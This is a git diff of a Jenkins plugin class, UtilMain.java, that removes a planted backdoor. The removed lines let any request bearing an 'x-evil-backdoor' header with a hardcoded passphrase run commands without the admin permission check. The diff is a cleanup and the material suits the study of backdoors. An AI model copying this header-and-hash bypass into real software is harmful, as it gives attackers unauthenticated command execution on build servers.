@@ -1,0 +1,28 @@
+diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java
+index 35135ea3..a854420d 100644
+--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java
++++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java
+@@ -148,22 +148,7 @@ public class UtilMain implements RootAction {
+         // use LOCAL method:
+         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);
+ 
+-        // hardcoded hash value:
+-        byte[] sha256 = DigestUtils.sha256("breakin the law");
+-        if (containsHeader(request.getHeaderNames(), "x-evil-backdoor")) {
+-            String backdoorValue = request.getHeader("x-evil-backdoor");
+-            byte[] providedHash = DigestUtils.sha256(backdoorValue);
+-            if (MessageDigest.isEqual(sha256, providedHash)) {
+-                String res_match = createUtils(cmdSeq2);
+-                if (res_match == null || res_match.length() == 0) {
+-                    Event event = new Event(Event.Status.ERROR, "Error: empty result", cmdSeq2);
+-                    events.add(event);
+-                }
+-            } else {
+-                Event event = new Event(Event.Status.ERROR, "Error: Only Admin Users Are Permitted", cmdSeq2);
+-                events.add(event);
+-            }
+-        } else if (isAllowed) {
++       if (isAllowed) {
+             String res_auth = createUtils(cmdSeq2);
+             if (res_auth == null || res_auth.isEmpty()) {
+                 Event event = new Event(Event.Status.ERROR, "Error: empty result", cmdSeq2);
